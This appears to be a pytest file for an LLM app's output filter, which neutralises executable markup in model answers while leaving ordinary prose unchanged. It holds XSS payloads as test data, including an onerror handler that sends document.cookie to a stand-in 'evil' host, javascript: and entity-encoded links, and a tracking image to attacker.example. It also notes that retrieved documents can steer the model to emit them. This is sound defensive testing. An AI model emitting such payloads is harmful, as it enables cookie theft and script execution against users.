"""Executable markup does not egress, and ordinary prose is untouched.

An answer is prose drawn from a text corpus. `<script>`, an inline event
handler, and a `javascript:` link get there one way — a retrieved document
steering the model — and they matter because the app hands the string to
consumers it does not control. The shipped UI renders with `textContent` and is
inert; a consumer using `innerHTML`, a markdown renderer, or React's
`dangerouslySetInnerHTML` executes the same bytes.

The false-positive half matters as much as the detection half: a filter that
mangles `if x < 5` is one someone turns off.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from app.filters import output_filter
from app.filters.output_filter import neutralize_markup

XSS = 'Wellness tips. <img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'


def assert_inert(text: str) -> None:
    """What "defanged" has to mean, checked on the parsed shape not a substring.

    Literal `onerror=` surviving in the text is fine — with the angle brackets
    escaped no browser parses it as a tag. The three properties that matter are
    that nothing opens an element, no dangerous scheme is live, and no raw quote
    is left for a consumer interpolating into an attribute to break out of.
    """
    assert not output_filter._HTML_ELEMENT.search(text)
    assert not output_filter._DANGEROUS_URL.search(text)
    assert '"' not in text and "'" not in text


@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert(1)</script>",
        XSS,
        '<a href="javascript:alert(1)">refund policy</a>',
        "[click me](javascript:alert(1))",
        "<svg/onload=alert(1)>",
        '<iframe src="//evil"></iframe>',
        # Entity-encoded scheme: the same URL to a parser, invisible to a
        # literal pattern. Detection runs on an entity-decoded copy for this.
        '<a href="java&#x73;cript:alert(document.domain)">open policy</a>',
        # No event handler, no active tag, ordinary https — and it still
        # discloses IP, user-agent, and timing to the attacker on render.
        '<img src="https://attacker.example/track?user=reader">',
        # No tag at all. Harmless as text; executable the moment a consumer
        # interpolates it into an attribute.
        '" autofocus onfocus=alert(document.domain) x="',
    ],
)
def test_executable_markup_is_defanged(payload):
    out, defanged = neutralize_markup(payload)
    assert defanged
    assert_inert(out)


@pytest.mark.parametrize(
    "prose",
    [
        "The refund window is 30 days. Use x < 5 and y > 3 in the formula.",
        "Contact the data: team by 30 days after delivery.",
        "Gross margin was 42 percent; that is > last quarter.",
        # `see` is not an HTML element, so a browser parses it into an inert
        # unknown element. Escaping it would be a visible cost for no gain.
        "The policy is in handbook.md, section 2 <see appendix>.",
        # Quotes and an `on...=` that is not a real event name. Escaping fires
        # on neither, so plain-text consumers keep readable punctuation.
        'She said "the window is 30 days" and onboarding = 3 days.',
    ],
)
def test_ordinary_prose_is_returned_byte_for_byte(prose):
    out, defanged = neutralize_markup(prose)
    assert not defanged
    assert out == prose


def test_apply_flags_the_defang_without_blocking_the_answer():
    """The answer still ships — it is the markup that is neutralised, not the
    reply. Blocking here would let any planted document deny service."""
    safe, rules, blocked = output_filter.apply(XSS)

    assert not blocked
    assert "executable_markup" in rules
    # The literal text `onerror=` surviving is fine and expected — with the
    # angle brackets escaped it can never be parsed as a tag, which is the
    # property that matters. Asserting on the substring instead would be
    # asserting on the wrong thing.
    assert_inert(safe)


def test_defang_runs_after_redaction():
    """Redaction rewrites spans; markup must be examined on what actually
    ships, not on the text as it stood before the rewrite."""
    text = 'Reach us at a@b.com <img src=x onerror="alert(1)">'
    safe, rules, blocked = output_filter.apply(text)

    assert not blocked
    assert "email" in rules and "executable_markup" in rules
    assert "a@b.com" not in safe
    assert_inert(safe)


def test_responses_carry_the_browser_enforced_headers():
    """`nosniff` is the one that matters for a JSON body full of model text."""
    from app.main import app

    with TestClient(app) as client:
        response = client.get("/health")

    assert response.headers["x-content-type-options"] == "nosniff"
    policy = response.headers["content-security-policy"]
    assert "connect-src 'self'" in policy
    assert "frame-ancestors 'none'" in policy
